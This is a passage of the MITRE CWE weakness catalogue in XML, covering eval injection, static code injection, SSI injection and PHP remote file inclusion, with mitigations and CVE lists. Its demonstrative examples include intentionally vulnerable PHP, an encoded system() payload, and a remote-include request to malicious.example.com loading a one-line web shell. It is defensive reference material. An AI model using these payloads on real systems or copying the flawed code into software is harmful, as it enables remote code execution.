               <Description>Eval injection in PHP program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5071</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1750</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1750</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1752</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1753</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1527</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2837</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2837</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1921</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2498</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2498</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3302</Reference>
               <Description>Code injection into Python eval statement from a field in a formatted file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1253</Reference>
               <Description>Eval injection in Python program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1471</Reference>
               <Description>chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1471</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2713</Reference>
               <Description>Chain: Execution after redirect triggers eval injection.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2713</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Direct Dynamic Code Evaluation ('Eval Injection')</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS35-PL</Entry_ID>
               <Entry_Name>Do not invoke the eval form with a string argument</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="35"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 18, &#34;Inline Evaluation&#34;, Page 1095"/>
         </References>
         <Notes>
            <Note Type="Other">Factors: special character errors can play a role in increasing the variety of code that can be injected, although some vulnerabilities do not require special characters at all, e.g. when a single function without arguments can be referenced and a terminator character is not necessary.</Note>
            <Note Type="Research Gap">This issue is probably under-reported. Most relevant CVEs have been for Perl and PHP, but eval injection applies to most interpreted languages. Javascript eval injection is likely to be heavily under-reported.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="96" Name="Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="94" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="94" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Perl" Prevalence="Undetermined"/>
            <Language Class="Interpreted" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This issue is most frequently found in PHP applications that allow users to set configuration variables that are stored within executable PHP files. Technically, this could also be performed in some compiled code (e.g. by byte-patching an executable), although it is highly unlikely.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The injected code could access restricted data / files.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>Perform proper output validation and escaping to neutralize all code syntax from data written to code files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-32">
               <Intro_Text>This example attempts to write user messages to a message file and allow users to view them.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$MessageFile = "cwe-94/messages.out";<xhtml:br/>if ($_GET["action"] == "NewMessage") {<xhtml:div style="margin-left:10px;">$name = $_GET["name"];<xhtml:br/>$message = $_GET["message"];<xhtml:br/>$handle = fopen($MessageFile, "a+");<xhtml:br/>fwrite($handle, "&lt;b&gt;$name&lt;/b&gt; says '$message'&lt;hr&gt;\n");<xhtml:br/>fclose($handle);<xhtml:br/>echo "Message Saved!&lt;p&gt;\n";</xhtml:div>}<xhtml:br/>else if ($_GET["action"] == "ViewMessages") {<xhtml:div style="margin-left:10px;">include($MessageFile);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name=h4x0r<xhtml:br/>message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E</xhtml:div>
               </Example_Code>
               <Body_Text>which will decode to the following:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>&lt;?php system("/bin/ls -l");?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.</Body_Text>
               <Body_Text>Notice that XSS (CWE-79) is also possible in this situation.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0495</Reference>
               <Description>Perl code directly injected into CGI library file from parameters to another CGI program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1876</Reference>
               <Description>Direct PHP code injection into supporting template file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1876</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1894</Reference>
               <Description>Direct code injection into PHP script that can be accessed by attacker.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1894</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0395</Reference>
               <Description>PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0395</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6652</Reference>
               <Description>chain: execution after redirect allows non-administrator to perform static code injection.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6652</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Direct Static Code Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">"HTML injection" (see CWE-79: XSS) could be thought of as an example of this, but the code is injected and executed on the client side, not the server side. Server-Side Includes (SSI) are an example of direct static code injection.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="97" Name="Improper Neutralization of Server-Side Includes (SSI) Within a Web Page" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The software generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="96" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="96" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Utilize an appropriate mix of whitelist and blacklist parsing to filter server-side include syntax from all input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Server-Side Includes (SSI) Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>36</Entry_ID>
               <Entry_Name>SSI Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This can be resultant from XSS/HTML injection because the same special characters can be involved. However, this is server-side code execution, not client-side.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="98" Name="Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions.</Description>
         <Extended_Description>In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the software will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="94" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="94" View_ID="699"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="426" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="216" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="PHP" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Remote file include</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>RFI</Term>
               <Description>The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Local file inclusion</Term>
               <Description>This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>The external control or influence of filenames can often be detected using automated static analysis that models data flow within the software.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>
                  <xhtml:p>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</xhtml:p>
                  <xhtml:p>Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Set allow_url_fopen to false, which limits the ability to include files from remote locations.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$dir = $_GET['module_name'];<xhtml:br/>include($dir . "/function.php");</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of "http://malicious.example.com" by using the following request string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>victim.php?module_name=http://malicious.example.com</xhtml:div>
               </Example_Code>
               <Body_Text>Upon receiving this request, the code would set 'module_name' to the value "http://malicious.example.com" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains.</Body_Text>
               <Body_Text>For the sake of this example, assume that the malicious version of function.php looks like the following:</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>system($_GET['cmd']);</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker could now go a step further in our example and provide a request string as follows:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>victim.php?module_name=http://malicious.example.com&amp;cmd=/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>/bin/ls -l</xhtml:div>
               </Example_Code>
               <Body_Text>Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-0285</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0030</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0030</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0068</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0068</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2157</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2162</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2198</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0128</Reference>
               <Description>Modification of assumed-immutable variable in configuration script leads to file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1864</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1869</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1869</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1870</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2154</Reference>
               <Description>PHP local file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2154</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1704</Reference>
               <Description>PHP remote file include.</Description>
